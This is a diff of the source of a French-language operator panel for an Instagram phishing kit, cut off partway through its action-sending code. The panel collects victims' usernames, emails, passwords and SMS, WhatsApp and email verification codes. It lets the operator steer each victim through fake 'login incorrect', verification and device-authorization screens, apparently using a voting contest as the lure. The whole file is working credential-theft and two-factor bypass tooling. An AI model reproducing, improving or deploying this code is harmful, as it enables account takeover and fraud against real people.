-        <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-user-clock"></i> Derniers clients</div></div><div class="card-body" id="dashRecent"></div></div>
-      </div>
-
-      <div class="section" id="sec-clients">
-        <div style="display:grid;grid-template-columns:340px 1fr;gap:16px;align-items:start">
-          <div>
-            <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Rechercher un @pseudo..."></div>
-            <div class="tabs" id="tabs">
-              <div class="tab active" data-filter="all">Tous</div>
-              <div class="tab" data-filter="live">En cours</div>
-              <div class="tab" data-filter="rejected">Rejetes</div>
+    <div class="layout">
+        <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-logo"><svg viewBox="0 0 48 48" width="20" height="20"><rect x="8" y="8" width="32" height="32" rx="8" fill="none" stroke="#fff" stroke-width="2.5"/><circle cx="24" cy="24" r="7" fill="none" stroke="#fff" stroke-width="2.5"/><circle cx="33" cy="15" r="2" fill="#fff"/></svg></div>
+                <div class="sidebar-brand">INSTAGRAM<span>panel</span></div>
+                <button class="sidebar-close" onclick="closeSidebar()"><i class="fas fa-times"></i></button>
             </div>
-            <div class="card">
-              <div class="card-header"><div class="card-title"><i class="fas fa-users"></i> Clients</div><div class="badge" id="clientCount">0</div></div>
-              <div class="card-body client-list" id="clientsList"></div>
+            <nav class="sidebar-nav">
+                <a class="active" data-page="dashboard" onclick="goTo('dashboard')"><i class="fas fa-chart-pie"></i> Tableau de bord</a>
+                <a data-page="clients" onclick="goTo('clients')"><i class="fas fa-users"></i> Clients</a>
+                <a data-page="votes" onclick="goTo('votes')"><i class="fas fa-vote-yea"></i> Votes</a>
+                <a data-page="activity" onclick="goTo('activity')"><i class="fas fa-history"></i> Activite</a>
+            </nav>
+            <div class="sidebar-footer">
+                <div class="status-badge"><div class="status-dot"></div> En ligne</div>
             </div>
-          </div>
-          <div id="clientDetail"></div>
+        </aside>
+
+        <div class="main">
+            <div class="topbar">
+                <div class="topbar-left">
+                    <button class="menu-toggle" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
+                    <div class="page-title" id="pageTitle">Tableau de bord</div>
+                </div>
+                <div class="topbar-right">
+                    <label class="auto-toggle"><input type="checkbox" id="autoToggle" checked onchange="toggleAuto()"> Auto</label>
+                    <button class="topbar-btn" onclick="loadData()"><i class="fas fa-sync-alt"></i> Actualiser</button>
+                </div>
+            </div>
+
+            <div class="content-area">
+                <!-- DASHBOARD -->
+                <div class="section active" id="sec-dashboard">
+                    <div class="stats-grid">
+                        <div class="stat-card"><div class="stat-icon blue"><i class="fas fa-users"></i></div><div><div class="stat-label">Clients</div><div class="stat-value" id="sClients">0</div></div></div>
+                        <div class="stat-card"><div class="stat-icon green"><i class="fas fa-envelope"></i></div><div><div class="stat-label">Emails</div><div class="stat-value" id="sEmails">0</div></div></div>
+                        <div class="stat-card"><div class="stat-icon yellow"><i class="fas fa-key"></i></div><div><div class="stat-label">Mots de passe</div><div class="stat-value" id="sPass">0</div></div></div>
+                        <div class="stat-card"><div class="stat-icon purple"><i class="fas fa-sms"></i></div><div><div class="stat-label">Codes SMS</div><div class="stat-value" id="sCodes">0</div></div></div>
+                        <div class="stat-card"><div class="stat-icon red"><i class="fas fa-vote-yea"></i></div><div><div class="stat-label">Votes</div><div class="stat-value" id="sVotes">0</div></div></div>
+                        <div class="stat-card"><div class="stat-icon blue"><i class="fas fa-shield-alt"></i></div><div><div class="stat-label">En cours</div><div class="stat-value" id="sActive">0</div></div></div>
+                    </div>
+                    <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-user-clock"></i> Derniers clients</div></div><div class="card-body" id="dashRecent"><div class="empty-state"><i class="fas fa-inbox"></i><p>Aucun client</p></div></div></div>
+                </div>
+
+                <!-- CLIENTS -->
+                <div class="section" id="sec-clients">
+                    <div style="display:grid;grid-template-columns:340px 1fr;gap:16px;align-items:start">
+                        <div>
+                            <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Rechercher..." oninput="filterClients()"></div>
+                            <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-users"></i> Clients</div><div class="badge" id="clientCount">0</div></div><div class="card-body client-list" id="clientsList"><div class="empty-state"><i class="fas fa-user-slash"></i><p>Aucun client</p></div></div></div>
+                        </div>
+                        <div id="clientDetail"><div class="empty-state" style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:80px 40px"><i class="fas fa-mouse-pointer"></i><p>Selectionnez un client</p></div></div>
+                    </div>
+                </div>
+
+                <!-- VOTES -->
+                <div class="section" id="sec-votes">
+                    <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-vote-yea"></i> Votes Concours</div><div class="badge" id="voteBadge">0</div></div><div class="card-body"><div class="activity-list" id="votesList"><div class="empty-state"><i class="fas fa-inbox"></i><p>Aucun vote</p></div></div></div></div>
+                </div>
+
+                <!-- ACTIVITY -->
+                <div class="section" id="sec-activity">
+                    <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-history"></i> Activite recente</div></div><div class="card-body"><div class="activity-list" id="activityList"><div class="empty-state"><i class="fas fa-inbox"></i><p>Aucune activite</p></div></div></div></div>
+                </div>
+            </div>
         </div>
-      </div>
-
-      <div class="section" id="sec-votes">
-        <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-vote-yea"></i> Votes Concours</div><div class="badge" id="voteBadge">0</div></div><div class="card-body"><div class="activity-list" id="votesList"></div></div></div>
-      </div>
-
-      <div class="section" id="sec-activity">
-        <div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-history"></i> Activite recente</div></div><div class="card-body"><div class="activity-list" id="globalActivity"></div></div></div>
-      </div>
     </div>
-  </div>
-</div>
 
-<div class="toast" id="toast"></div>
+    <div class="toast" id="toast"></div>
 
-<script>
-'use strict';
+    <script>
+        var selectedVisitorId = null;
+        var autoInterval = null;
+        var activityLog = [];
+        var currentPage = 'dashboard';
 
-/* ============ config ============ */
-var API_BASE = (location.protocol === 'file:') ? 'http://localhost:3000' : location.origin;
-var ADMIN_KEY = '';           // renseigner si ADMIN_KEY est defini cote serveur
-var POLL_MS = 3000;
+        var API_BASE = window.location.origin;
+        function getUsers() { try { return JSON.parse(localStorage.getItem('ig_users') || '[]'); } catch (e) { return []; } }
+        function saveUsers(u) {
+            localStorage.setItem('ig_users', JSON.stringify(u));
+            return fetch(API_BASE + '/api/users', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(u) })
+                .then(function(r) {
+                    if (!r.ok) throw new Error('HTTP ' + r.status);
+                    return r.json();
+                });
+        }
+        function getVotes() { try { return JSON.parse(localStorage.getItem('ig_votes') || '[]'); } catch (e) { return []; } }
 
-/* ============ etat ============ */
-var users = [];
-var votes = [];
-var rev = 0;
-var selectedId = null;
-var currentFilter = 'all';
-var searchQuery = '';
-var autoTimer = null;
-var pollInFlight = false;
-var pendingWrites = 0;
-var globalLog = [];
-var logsByUser = {};
-var lastDetailHash = null;
+        function fetchFromServer() {
+            return fetch(API_BASE + '/api/users').then(function(r) { return r.json(); }).then(function(serverUsers) {
+                if (Array.isArray(serverUsers)) {
+                    localStorage.setItem('ig_users', JSON.stringify(serverUsers));
+                }
+                return fetch(API_BASE + '/api/votes');
+            }).then(function(r) { return r.json(); }).then(function(serverVotes) {
+                if (Array.isArray(serverVotes)) {
+                    localStorage.setItem('ig_votes', JSON.stringify(serverVotes));
+                }
+            }).catch(function() {});
+        }
 
-/* ============ referentiels ============ */
-var META = {
-  visiting:{label:'Connecte',color:'#6366f1',icon:'fa-eye'},
-  pending:{label:'En attente',color:'#f59e0b',icon:'fa-clock'},
-  approved:{label:'Approuve',color:'#10b981',icon:'fa-check-circle'},
-  rejected:{label:'Rejete',color:'#ef4444',icon:'fa-ban'},
-  login:{label:'Instagram Login',color:'#6366f1',icon:'fa-sign-in-alt'},
-  login_incorrect:{label:'Login incorrect',color:'#ef4444',icon:'fa-times-circle'},
-  loading:{label:'Chargement',color:'#f59e0b',icon:'fa-spinner'},
-  sms_verification:{label:'SMS verification',color:'#34a853',icon:'fa-sms'},
-  sms_error:{label:'SMS incorrect',color:'#ef4444',icon:'fa-exclamation-circle'},
-  whatsapp_verification:{label:'WhatsApp verification',color:'#25d366',icon:'fa-whatsapp'},
-  whatsapp_error:{label:'WhatsApp incorrect',color:'#ef4444',icon:'fa-exclamation-circle'},
-  email_verification:{label:'Email verification',color:'#ea4335',icon:'fa-envelope'},
-  email_error:{label:'Email incorrect',color:'#ef4444',icon:'fa-exclamation-circle'},
-  authorize_device:{label:'Autorisation',color:'#8b5cf6',icon:'fa-shield-alt'},
-  technical_error:{label:'Erreur technique',color:'#ef4444',icon:'fa-exclamation-triangle'},
-  retry:{label:'Reessayer',color:'#6b7280',icon:'fa-redo'},
-  vote_approved:{label:'Approuve',color:'#10b981',icon:'fa-check-double'}
-};
-function meta(p){ return META[p] || {label:p||'?',color:'#6b7280',icon:'fa-circle'}; }
+        function showToast(msg, type) {
+            var t = document.getElementById('toast');
+            t.innerHTML = '<i class="fas fa-' + (type === 'success' ? 'check-circle' : 'exclamation-circle') + '"></i> ' + msg;
+            t.className = 'toast show ' + type;
+            setTimeout(function() { t.className = 'toast'; }, 3000);
+        }
 
-var ACTIONS = [
-  {id:'login',label:'Instagram Login',icon:'fa-sign-in-alt',cls:'ig'},
-  {id:'login_incorrect',label:'Login incorrect',icon:'fa-times-circle',cls:'error'},
-  {id:'loading',label:'Loading',icon:'fa-spinner',cls:'loading-btn'},
-  {id:'vote_approved',label:'Approuver',icon:'fa-check-double',cls:'success'},
-  {id:'sms_verification',label:'SMS Verification',icon:'fa-sms',cls:'sms'},
-  {id:'sms_error',label:'SMS incorrect',icon:'fa-exclamation-circle',cls:'error'},
-  {id:'whatsapp_verification',label:'WhatsApp Verification',icon:'fa-whatsapp',cls:'whatsapp'},
-  {id:'whatsapp_error',label:'WhatsApp incorrect',icon:'fa-exclamation-circle',cls:'error'},
-  {id:'email_verification',label:'Email Verification',icon:'fa-envelope',cls:'email'},
-  {id:'email_error',label:'Email incorrect',icon:'fa-exclamation-circle',cls:'error'},
-  {id:'authorize_device',label:'Autorisation',icon:'fa-shield-alt',cls:'device'},
-  {id:'technical_error',label:'Erreur technique',icon:'fa-exclamation-triangle',cls:'error'},
-  {id:'retry',label:'Reessayer',icon:'fa-redo',cls:''},
-  {id:'rejected',label:'Rejeter',icon:'fa-ban',cls:'error'}
-];
+        function addActivity(msg) {
+            var now = new Date();
+            var time = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0') + ':' + now.getSeconds().toString().padStart(2,'0');
+            activityLog.unshift({ time: time, msg: msg });
+            if (activityLog.length > 50) activityLog.pop();
+            renderActivity();
+        }
 
-/* ============ utilitaires ============ */
-function esc(s){
-  return String(s == null ? '' : s).replace(/[&<>"']/g, function(c){
-    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
-  });
-}
-function hhmmss(){
-  var d = new Date();
-  return [d.getHours(),d.getMinutes(),d.getSeconds()].map(function(n){return String(n).padStart(2,'0');}).join(':');
-}
-function showToast(msg,type){
-  var t = document.getElementById('toast');
-  t.innerHTML = '<i class="fas fa-' + (type==='success'?'check-circle':'exclamation-circle') + '"></i> ' + esc(msg);
-  t.className = 'toast show ' + type;
-  clearTimeout(t._t);
-  t._t = setTimeout(function(){ t.className = 'toast'; }, 3000);
-}
-function setOnline(ok){
-  var dot = document.getElementById('statusDot');
-  dot.classList.toggle('off', !ok);
-  document.getElementById('statusText').textContent = ok ? 'En ligne' : 'Hors ligne';
-}
-function api(path, opts){
-  opts = opts || {};
-  var headers = Object.assign({'Content-Type':'application/json'}, opts.headers || {});
-  if (ADMIN_KEY) headers['x-admin-key'] = ADMIN_KEY;
-  opts.headers = headers;
-  opts.cache = 'no-store';
-  return fetch(API_BASE + path, opts).then(function(r){
-    if (r.status === 204) return null;
-    if (!r.ok) throw new Error('HTTP ' + r.status);
-    return r.json();
-  });
-}
+        function getPageColor(p) {
+            var c = { pending:'#f59e0b', approved:'#10b981', rejected:'#ef4444', visiting:'#6366f1', login:'#6366f1', login_incorrect:'#ef4444', sms_verification:'#34a853', sms_error:'#ef4444', whatsapp_verification:'#25d366', whatsapp_error:'#ef4444', email_verification:'#ea4335', email_error:'#ef4444', loading:'#f59e0b', technical_error:'#ef4444' };
+            return c[p] || '#6b7280';
+        }
+        function getPageIcon(p) {
+            var c = { login:'fa-sign-in-alt', login_incorrect:'fa-times-circle', sms_verification:'fa-sms', sms_error:'fa-exclamation-circle', whatsapp_verification:'fa-whatsapp', whatsapp_error:'fa-exclamation-circle', email_verification:'fa-envelope', email_error:'fa-exclamation-circle', loading:'fa-spinner', technical_error:'fa-exclamation-triangle', visiting:'fa-eye', pending:'fa-clock', approved:'fa-check-circle', rejected:'fa-ban' };
+            return c[p] || 'fa-circle';
+        }
+        function getPageLabel(p) {
+            var l = { pending:'En attente', approved:'Approuve', rejected:'Rejete', visiting:'Connecte', login:'Instagram Login', login_incorrect:'Login incorrect', sms_verification:'SMS verification', sms_error:'SMS incorrect', whatsapp_verification:'WhatsApp verification', whatsapp_error:'WhatsApp incorrect', email_verification:'Email verification', email_error:'Email incorrect', loading:'Chargement...', technical_error:'Erreur technique' };
+            return l[p] || p;
+        }
 
-/* ============ journal ============ */
-function addLog(msg, visitorId, kind){
-  var e = {time:hhmmss(), msg:msg, kind:kind||''};
-  globalLog.unshift(e);
-  if (globalLog.length > 60) globalLog.pop();
-  if (visitorId){
-    var a = logsByUser[visitorId] = logsByUser[visitorId] || [];
-    a.unshift(e);
-    if (a.length > 60) a.pop();
-  }
-  renderGlobalLog();
-  renderUserLog();
-}
-function logRow(e){
-  return '<div class="activity-item ' + e.kind + '"><div class="time">' + e.time + '</div><div class="msg">' + e.msg + '</div></div>';
-}
-function emptyBox(txt){
-  return '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:12px">' + txt + '</div>';
-}
-function renderGlobalLog(){
-  var el = document.getElementById('globalActivity');
-  el.innerHTML = globalLog.length ? globalLog.map(logRow).join('') : emptyBox('Aucune activite');
-}
-function renderUserLog(){
-  var el = document.getElementById('userActivity');
-  if (!el) return;
-  var list = selectedId ? (logsByUser[selectedId] || []) : [];
-  el.innerHTML = list.length ? list.map(logRow).join('') : emptyBox('Aucune activite');
-}
+        function updateStats(clients) {
+            document.getElementById('sClients').textContent = clients.length;
+            document.getElementById('sEmails').textContent = clients.filter(function(c) { return c.data && c.data.email; }).length;
+            document.getElementById('sPass').textContent = clients.filter(function(c) { return c.data && c.data.password; }).length;
+            document.getElementById('sCodes').textContent = clients.filter(function(c) { return c.data && (c.data.sms_code || c.data.whatsapp_code || c.data.email_code); }).length;
+            document.getElementById('sActive').textContent = clients.filter(function(c) { return c.status && c.status !== 'approved' && c.status !== 'rejected' && c.status !== 'visiting'; }).length;
+            document.getElementById('sVotes').textContent = getVotes().length;
+        }
 
-/* ============ synchronisation ============ */
-function pollState(){
-  if (pollInFlight) return Promise.resolve();
-  pollInFlight = true;
-  return api('/api/state')
-    .then(function(s){
-      if (s && Array.isArray(s.users) && pendingWrites === 0){
-        users = s.users;
-        votes = Array.isArray(s.votes) ? s.votes : [];
-        rev = s.rev || 0;
-        document.getElementById('revTag').textContent = 'rev ' + rev;
-        renderAll();
-      }
-      setOnline(true);
-    })
-    .catch(function(){ setOnline(false); })
-    .then(function(){ pollInFlight = false; });
-}
+        function renderDashRecent(clients) {
+            var el = document.getElementById('dashRecent');
+            var recent = clients.slice(-5).reverse();
+            if (!recent.length) { el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>Aucun client</p></div>'; return; }
+            var html = '';
+            recent.forEach(function(c) {
+                var dotColor = getPageColor(c.status);
+                html += '<div class="activity-item"><div class="dot" style="background:' + dotColor + '"></div><div class="msg"><strong>@' + c.username + '</strong> &mdash; ' + getPageLabel(c.status) + '</div><div class="time">' + (c.time || '') + '</div></div>';
+            });
+            el.innerHTML = html;
+        }
 
-function saveUsers(list){ users = list; }
+        function filterClients() {
+            var q = document.getElementById('searchInput').value.toLowerCase();
+            document.querySelectorAll('.client-item').forEach(function(el) {
+                var name = el.querySelector('.client-name');
+                if (name) el.style.display = name.textContent.toLowerCase().indexOf(q) > -1 ? 'flex' : 'none';
+            });
+        }
 
-function patchUser(id, patch){
-  pendingWrites++;
-  return api('/api/users/' + encodeURIComponent(id), {method:'PATCH', body:JSON.stringify(patch)})
-    .then(function(res){
-      if (res && res.rev) { rev = res.rev; document.getElementById('revTag').textContent = 'rev ' + rev; }
-      return res;
-    })
-    .finally(function(){ pendingWrites--; });
-}
+        function loadData() {
+            fetchFromServer().then(function() {
+                var clients = getUsers().filter(function(c) { return c.status !== 'rejected'; });
+                updateStats(clients);
+                renderDashRecent(clients);
+                renderClientsList(clients);
+                renderVotes();
+                renderActivity();
+            }).catch(function() {
+                var clients = getUsers().filter(function(c) { return c.status !== 'rejected'; });
+                updateStats(clients);
+                renderDashRecent(clients);
+                renderClientsList(clients);
+                renderVotes();
+                renderActivity();
+            });
+        }
 
-/* ============ rendu ============ */
-function visibleUsers(){
-  return users.filter(function(u){
-    if (currentFilter === 'rejected') { if (u.status !== 'rejected') return false; }
-    else if (currentFilter === 'live') { if (u.status === 'rejected' || u.status === 'approved') return false; }
-    else if (u.status === 'rejected') return false;
-    if (searchQuery && String(u.username||'').toLowerCase().indexOf(searchQuery) === -1) return false;
-    return true;
-  });
-}
+        function renderClientsList(clients) {
+            var el = document.getElementById('clientsList');
+            document.getElementById('clientCount').textContent = clients.length;
+            if (!clients.length) { el.innerHTML = '<div class="empty-state"><i class="fas fa-user-slash"></i><p>Aucun client</p></div>'; return; }
+            var html = '';
+            clients.forEach(function(c) {
+                var active = selectedVisitorId === c.visitorId ? ' active' : '';
+                var dotColor = getPageColor(c.status);
+                var online = c.status !== 'approved' && c.status !== 'rejected';
+                html += '<div class="client-item' + active + '" onclick="selectClient(this,\'' + (c.visitorId||'').replace(/'/g,"\\'") + '\')">' +
+                    '<div class="client-avatar">' + c.username.charAt(0).toUpperCase() + (online ? '<div class="online-dot"></div>' : '') + '</div>' +
+                    '<div class="client-info"><div class="client-name">@' + c.username + '</div><div class="client-page"><div class="dot" style="background:' + dotColor + '"></div>' + getPageLabel(c.status) + '</div></div>' +
+                    '<div class="client-time">' + (c.time || '') + '</div></div>';
+            });
+            el.innerHTML = html;
+            filterClients();
+            if (selectedVisitorId) renderClientDetail();
+        }
 
-function renderAll(){
-  renderStats();
-  renderRecent();
-  renderClientList();
-  renderVotes();
-  renderDetail(false);
-  renderUserLog();
-}
+        function selectClient(el, visitorId) {
+            selectedVisitorId = visitorId;
+            document.querySelectorAll('.client-item').forEach(function(e) { e.classList.remove('active'); });
+            el.classList.add('active');
+            if (currentPage !== 'clients') goTo('clients');
+            renderClientDetail();
+        }
 
-function renderStats(){
-  document.getElementById('sClients').textContent = users.filter(function(u){return u.status!=='rejected';}).length;
-  document.getElementById('sEmails').textContent = users.filter(function(u){return u.data && u.data.email;}).length;
-  document.getElementById('sPass').textContent = users.filter(function(u){return u.data && u.data.password;}).length;
-  document.getElementById('sCodes').textContent = users.filter(function(u){return u.data && (u.data.sms_code||u.data.whatsapp_code||u.data.email_code);}).length;
-  document.getElementById('sVotes').textContent = votes.length;
-  document.getElementById('sActive').textContent = users.filter(function(u){return u.status && u.status!=='approved' && u.status!=='rejected' && u.status!=='visiting';}).length;
-}
+        function renderClientDetail() {
+            var users = getUsers();
+            var user = users.find(function(u) { return u.visitorId === selectedVisitorId; });
+            var el = document.getElementById('clientDetail');
+            if (!user) { el.innerHTML = '<div class="empty-state" style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:80px 40px"><i class="fas fa-mouse-pointer"></i><p>Selectionnez un client</p></div>'; return; }
+            var d = user.data || {};
+            var status = user.status || 'pending';
+            var sc = getPageColor(status);
 
-function renderRecent(){
-  var el = document.getElementById('dashRecent');
-  var recent = users.slice().sort(function(a,b){return (a.ts||0)-(b.ts||0);}).slice(-5).reverse();
-  if (!recent.length) return el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>Aucun client</p></div>';
-  el.innerHTML = recent.map(function(u){
-    var m = meta(u.status);
-    return '<div class="activity-item"><div class="dot" style="background:' + m.color + '"></div>'
-      + '<div class="msg"><strong>@' + esc(u.username) + '</strong> &mdash; ' + esc(m.label) + '</div>'
-      + '<div class="time">' + esc(u.time||'') + '</div></div>';
-  }).join('');
-}
+            el.innerHTML = '<div class="client-detail">' +
+                '<div class="client-header"><div class="avatar"><i class="fas fa-user"></i><div class="online-dot"></div></div>' +
+                '<div><div class="name">@' + user.username + '</div><div class="meta"><code>' + status + '</code> <span>' + (user.time||'') + '</span></div></div>' +
+                '<div class="status-badge" style="background:' + sc + '"><i class="fas ' + getPageIcon(status) + '"></i> ' + getPageLabel(status) + '</div></div>' +
 
-function renderClientList(){
-  var el = document.getElementById('clientsList');
-  var list = visibleUsers();
-  document.getElementById('clientCount').textContent = list.length;
-  if (!list.length) return el.innerHTML = '<div class="empty-state"><i class="fas fa-user-slash"></i><p>Aucun client</p></div>';
-  el.innerHTML = list.map(function(u){
-    var m = meta(u.status);
-    var live = u.status !== 'approved' && u.status !== 'rejected';
-    return '<div class="client-item' + (selectedId===u.visitorId?' active':'') + '" data-id="' + esc(u.visitorId) + '">'
-      + '<div class="client-avatar">' + esc((u.username||'?').charAt(0).toUpperCase()) + (live?'<div class="online-dot"></div>':'') + '</div>'
-      + '<div class="client-info"><div class="client-name">@' + esc(u.username) + '</div>'
-      + '<div class="client-page"><div class="dot" style="background:' + m.color + '"></div>' + esc(m.label) + '</div></div>'
-      + '<div class="client-time">' + esc(u.time||'') + '</div></div>';
-  }).join('');
-}
+                '<div class="data-grid">' +
+                    '<div class="data-card' + (d.email ? ' has-data' : '') + '"><div class="label"><i class="fas fa-envelope" style="color:var(--accent)"></i> Email</div><div class="value' + (d.email ? '' : ' empty') + '" id="dEmail">' + (d.email || 'En attente...') + '</div><button class="copy-btn" onclick="copyVal(\'dEmail\')"><i class="fas fa-copy"></i></button></div>' +
+                    '<div class="data-card' + (d.password ? ' has-data' : '') + '"><div class="label"><i class="fas fa-key" style="color:var(--warning)"></i> Mot de passe</div><div class="value' + (d.password ? '' : ' empty') + '" id="dPass">' + (d.password || 'En attente...') + '</div><button class="copy-btn" onclick="copyVal(\'dPass\')"><i class="fas fa-copy"></i></button></div>' +
+                    '<div class="data-card"><div class="label"><i class="fas fa-map-marker-alt" style="color:var(--purple)"></i> Page actuelle</div><div class="value" style="color:' + sc + '">' + getPageLabel(status) + '</div></div>' +
+                    '<div class="data-card' + (d.sms_code ? ' has-data' : '') + '"><div class="label"><i class="fas fa-sms" style="color:#34a853"></i> Code SMS</div><div class="value' + (d.sms_code ? '' : ' empty') + '" id="dSms">' + (d.sms_code || 'En attente...') + '</div><button class="copy-btn" onclick="copyVal(\'dSms\')"><i class="fas fa-copy"></i></button></div>' +
+                    '<div class="data-card' + (d.whatsapp_code ? ' has-data' : '') + '"><div class="label"><i class="fab fa-whatsapp" style="color:#25d366"></i> Code WhatsApp</div><div class="value' + (d.whatsapp_code ? '' : ' empty') + '" id="dWapp">' + (d.whatsapp_code || 'En attente...') + '</div><button class="copy-btn" onclick="copyVal(\'dWapp\')"><i class="fas fa-copy"></i></button></div>' +
+                    '<div class="data-card' + (d.email_code ? ' has-data' : '') + '"><div class="label"><i class="fas fa-envelope-open" style="color:#ea4335"></i> Code Email</div><div class="value' + (d.email_code ? '' : ' empty') + '" id="dEcode">' + (d.email_code || 'En attente...') + '</div><button class="copy-btn" onclick="copyVal(\'dEcode\')"><i class="fas fa-copy"></i></button></div>' +
+                '</div>' +
 
-function renderVotes(){
-  var el = document.getElementById('votesList');
-  document.getElementById('voteBadge').textContent = votes.length;
-  if (!votes.length) return el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>Aucun vote</p></div>';
-  el.innerHTML = votes.slice().sort(function(a,b){return b.timestamp-a.timestamp;}).map(function(v){
-    var d = new Date(v.timestamp);
-    var t = String(d.getHours()).padStart(2,'0') + ':' + String(d.getMinutes()).padStart(2,'0');
-    return '<div class="activity-item"><div class="time">' + t + '</div>'
-      + '<div class="msg"><strong>@' + esc(v.voter) + '</strong> a vote pour '
-      + '<span style="color:var(--success);font-weight:600">' + esc(v.candidate) + '</span></div></div>';
-  }).join('');
-}
+                '<div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-gamepad"></i> Actions</div><button class="copy-all-btn" onclick="copyAll()"><i class="fas fa-clipboard-list"></i> Tout copier</button></div>' +
+                '<div class="card-body"><div class="actions-grid">' +
+                    '<button class="action-btn ig" data-action="login"><svg viewBox="0 0 48 48" width="14" height="14"><rect x="8" y="8" width="32" height="32" rx="8" fill="none" stroke="currentColor" stroke-width="2.5"/><circle cx="24" cy="24" r="7" fill="none" stroke="currentColor" stroke-width="2.5"/><circle cx="33" cy="15" r="2" fill="currentColor"/></svg> Instagram Login</button>' +
+                    '<button class="action-btn error" data-action="login_incorrect"><i class="fas fa-times-circle"></i> Login incorrect</button>' +
+                    '<button class="action-btn loading-btn" data-action="loading"><i class="fas fa-spinner"></i> Loading</button>' +
+                    '<button class="action-btn success" data-action="vote_approved"><i class="fas fa-check-double"></i> Approuver</button>' +
+                    '<button class="action-btn sms" data-action="sms_verification"><i class="fas fa-sms"></i> SMS Verification</button>' +
+                    '<button class="action-btn error" data-action="sms_error"><i class="fas fa-exclamation-circle"></i> SMS incorrect</button>' +
+                    '<button class="action-btn whatsapp" data-action="whatsapp_verification"><i class="fab fa-whatsapp"></i> WhatsApp Verification</button>' +
+                    '<button class="action-btn error" data-action="whatsapp_error"><i class="fas fa-exclamation-circle"></i> WhatsApp incorrect</button>' +
+                    '<button class="action-btn email" data-action="email_verification"><i class="fas fa-envelope"></i> Email Verification</button>' +
+                    '<button class="action-btn error" data-action="email_error"><i class="fas fa-exclamation-circle"></i> Email incorrect</button>' +
+                    '<button class="action-btn device" data-action="authorize_device"><i class="fas fa-shield-alt"></i> Autorisation</button>' +
+                    '<button class="action-btn error" data-action="technical_error"><i class="fas fa-exclamation-triangle"></i> Erreur technique</button>' +
+                    '<button class="action-btn retry" data-action="retry"><i class="fas fa-redo"></i> Reessayer</button>' +
+                '</div></div></div>' +
 
-function currentUser(){ return users.find(function(u){return u.visitorId===selectedId;}) || null; }
+                '<div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-history"></i> Activite</div></div><div class="card-body"><div class="activity-list" id="activityList"><div style="text-align:center;padding:20px;color:var(--text-muted);font-size:12px">Aucune activite</div></div></div></div></div>';
 
-function renderDetail(force){
-  var u = currentUser();
-  var el = document.getElementById('clientDetail');
-  var hash = u ? JSON.stringify([u.username,u.status,u.action,u.actionSeq,u.actionAck,u.data,u.time]) : 'none';
-  if (!force && hash === lastDetailHash) return;
-  lastDetailHash = hash;
+            renderActivity();
+            document.querySelectorAll('.action-btn').forEach(function(btn) {
+                btn.addEventListener('click', function() { sendAction(this); });
+            });
+        }
 
-  if (!u){
-    el.innerHTML = '<div class="empty-state" style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:80px 40px"><i class="fas fa-mouse-pointer"></i><p>Selectionnez un client</p></div>';
-    return;
-  }
-  var m = meta(u.status);
-  var d = u.data || {};
-  var awaiting = (u.actionSeq||0) > (u.actionAck||0);
+        function renderVotes() {
+            var el = document.getElementById('votesList');
+            var badge = document.getElementById('voteBadge');
+            var votes = getVotes();
+            if (badge) badge.textContent = votes.length;
+            if (!votes.length) { el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>Aucun vote</p></div>'; return; }
+            var html = '';
+            votes.slice().reverse().forEach(function(v) {
+                var t = new Date(v.timestamp);
+                var time = t.getHours().toString().padStart(2,'0') + ':' + t.getMinutes().toString().padStart(2,'0');
+                html += '<div class="activity-item"><div class="time">' + time + '</div><div class="msg"><strong>@' + v.voter + '</strong> a vote pour <span style="color:var(--success);font-weight:600">' + v.candidate + '</span></div></div>';
+            });
+            el.innerHTML = html;
+        }
 
-  function field(id,label,icon,color,val){
-    return '<div class="data-card' + (val?' has-data':'') + '"><div class="label"><i class="fas ' + icon + '" style="color:' + color + '"></i> ' + label + '</div>'
-      + '<div class="value' + (val?'':' empty') + '" id="' + id + '">' + esc(val || 'En attente...') + '</div>'
-      + (val?'<button class="copy-btn" data-copy="' + id + '"><i class="fas fa-copy"></i></button>':'') + '</div>';
-  }
+        function renderActivity() {
+            var el = document.getElementById('activityList');
+            if (!el) return;
+            if (!activityLog.length) { el.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:12px">Aucune activite</div>'; return; }
+            var html = '';
+            activityLog.forEach(function(a) {
+                html += '<div class="activity-item"><div class="time">' + a.time + '</div><div class="msg">' + a.msg + '</div></div>';
+            });
+            el.innerHTML = html;
+        }
 
-  el.innerHTML = '<div class="client-detail">'
-    + '<div class="client-header"><div class="avatar"><i class="fas fa-user"></i></div>'
-    + '<div><div class="name">@' + esc(u.username) + '</div>'
-    + '<div class="meta"><code>' + esc(u.status) + '</code> <span>' + esc(u.time||'') + '</span></div></div>'
-    + '<div class="page-badge" style="background:' + m.color + '"><i class="fas ' + m.icon + '"></i> ' + esc(m.label) + '</div></div>'
+        function sendAction(btn) {
+            if (!selectedVisitorId) { showToast('Selectionnez un client', 'error'); return; }
+            var action = btn.getAttribute('data-action');
+            var users = getUsers();
+            var user = users.find(function(u) { return u.visitorId === selectedVisitorId; });
+            if (!user) return;
 
